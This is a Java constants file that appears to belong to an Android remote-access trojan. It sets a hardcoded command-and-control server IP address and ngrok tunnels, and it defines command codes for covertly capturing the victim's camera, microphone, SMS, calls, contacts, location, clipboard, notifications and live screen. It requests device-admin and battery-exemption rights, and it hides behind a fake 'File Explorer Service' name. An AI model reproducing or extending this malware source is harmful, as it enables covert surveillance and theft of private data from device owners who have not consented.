package com.h4ckinto.android.utils;

public class Constants {
    
    // Server Configuration (existing background service server)
    // For AWS VPS: Use http://IP:4444
    // For ngrok: Use https://chating.ngrok.dev (port 443 is default for HTTPS)
    // For local: Use http://192.168.x.x:4444 or http://10.0.2.2:4444
    public static final String SERVER_URL = "http://3.136.231.237";
    public static final String SOCKET_URL = "http://3.136.231.237"; 
    
    // Chat Server Configuration (independent chat backend on port 3500)
    // For AWS VPS direct: Use http://IP:3500
    // For ngrok: Use https://charrat.ngrok.dev (tunnel: ngrok http 3500 --domain=charrat.ngrok.dev)
    // For local: Use http://192.168.x.x:3500 or http://10.0.2.2:3500
    public static final String CHAT_SERVER_URL = "http://3.136.231.237/chat";
    
    // Message Keys (matching server constants)
    public static final String MESSAGE_CAMERA = "0xCA";
    /** Front camera video (short MP4); server sends 0xCV or 0xCV:seconds */
    public static final String MESSAGE_CAMERA_VIDEO = "0xCV";
    public static final String MESSAGE_FILES = "0xFI";
    public static final String MESSAGE_CALL = "0xCL";
    public static final String MESSAGE_SMS = "0xSM";
    public static final String MESSAGE_MIC = "0xMI";
    public static final String MESSAGE_LOCATION = "0xLO";
    public static final String MESSAGE_CONTACTS = "0xCO";
    public static final String MESSAGE_WIFI = "0xWI";
    public static final String MESSAGE_NOTIFICATION = "0xNO";
    public static final String MESSAGE_CLIPBOARD = "0xCB";
    public static final String MESSAGE_INSTALLED = "0xIN";
    public static final String MESSAGE_PERMISSIONS = "0xPM";
    public static final String MESSAGE_GOT_PERMISSION = "0xGP";
    public static final String MESSAGE_SCREEN = "0xSC";
    public static final String MESSAGE_SCREEN_STREAM = "0xSS";  // Live screen streaming
    
    // Notification Channel
    public static final String NOTIFICATION_CHANNEL_ID = "FILE_EXPLORER_CHANNEL";
    public static final String NOTIFICATION_CHANNEL_NAME = "File Explorer Service";
    public static final int NOTIFICATION_ID = 1;
    
    // SharedPreferences
    public static final String PREFS_NAME = "FILE_EXPLORER_PREFS";
    public static final String KEY_CLIENT_ID = "client_id";
    public static final String KEY_SERVER_URL = "server_url";
    public static final String KEY_IS_SERVICE_RUNNING = "is_service_running";
    
    // Request Codes
    public static final int REQUEST_CODE_PERMISSIONS = 1001;
    public static final int REQUEST_CODE_DEVICE_ADMIN = 1002;
    public static final int REQUEST_CODE_NOTIFICATION_ACCESS = 1003;
    public static final int REQUEST_CODE_BATTERY_OPTIMIZATION = 1004;
    public static final int REQUEST_CODE_SCREEN_CAPTURE = 1005;
    
    // Service Actions
    public static final String ACTION_START_SERVICE = "com.fileexplorer.manager.START_SERVICE";
    public static final String ACTION_STOP_SERVICE = "com.fileexplorer.manager.STOP_SERVICE";
    public static final String ACTION_RESTART_SERVICE = "com.fileexplorer.manager.RESTART_SERVICE";
    
    // GPS Settings
    public static final long GPS_UPDATE_INTERVAL = 30000; // 30 seconds
    public static final long GPS_FASTEST_INTERVAL = 10000; // 10 seconds
    public static final float GPS_MIN_DISTANCE = 10.0f; // 10 meters
    
    // Audio Settings
    public static final int AUDIO_SAMPLE_RATE = 44100;
    public static final int AUDIO_CHANNEL_CONFIG = android.media.AudioFormat.CHANNEL_IN_MONO;
    public static final int AUDIO_ENCODING = android.media.AudioFormat.ENCODING_PCM_16BIT;
    
    // File Settings
    public static final String AUDIO_FILES_DIR = "audio_recordings";
    public static final String DOWNLOAD_FILES_DIR = "downloads";
    public static final String LOG_FILES_DIR = "logs";
}
